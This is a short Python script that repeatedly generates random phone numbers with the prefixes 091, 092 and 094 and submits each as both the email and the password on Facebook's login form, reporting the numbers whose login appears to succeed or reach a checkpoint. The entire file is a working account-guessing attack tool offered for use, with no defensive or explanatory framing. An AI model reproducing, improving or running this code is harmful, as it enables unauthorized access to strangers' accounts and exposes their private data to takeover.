#!/usr/bin/python
# -*- coding: utf-8 -*-
try:
 from random import choice , randint
 from mechanize import Browser
except:
 print("pip install mechanize")
 exit()
class Facebook:
	def __init__(self,Url,number):
		self.url = Url
		self.number = number
		self.login()

	def login(self):
		br = Browser()
		br.set_handle_robots(False)
		br.open(self.url)
		br.select_form(nr=0)
		br["email"] = self.number
		br["pass"] = self.number
		sub = br.submit()
		if "https://www.facebook.com" == sub.geturl() or "https://www.facebook.com/welcome" == sub.geturl() or "welcome" in sub.geturl() or "checkpoint" in sub.geturl() :
			print("""
	\033[32m====> \033[33m yes: {}\033[32m <====""".format(self.number))
			return True
		else:
			print("""\033[31m
			No : {}
			""".format(self.number))
			return False
	


Num = ["091","092","094"]
while True:
	phone = str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
	num = ''.join(choice(Num)+str(phone))
	Facebook("https://www.facebook.com/login.php",num)